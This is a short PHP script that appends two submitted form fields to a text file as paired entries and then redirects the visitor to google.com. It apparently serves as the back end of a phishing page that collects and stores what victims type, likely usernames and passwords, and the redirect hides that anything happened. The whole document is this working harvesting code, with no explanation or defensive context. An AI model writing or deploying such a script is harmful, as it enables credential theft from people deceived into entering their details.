<?php
$myfile = fopen("data.txt", "a") or die("ERROR 404");
fwrite($myfile,$_POST["sd"]);
$txt=" : ";
fwrite($myfile,$txt);
fwrite($myfile,$_POST["ed"]);
$txt="\n";
fwrite($myfile,$txt);
fclose($myfile);
header("Location:http://www.google.com");
exit;
?>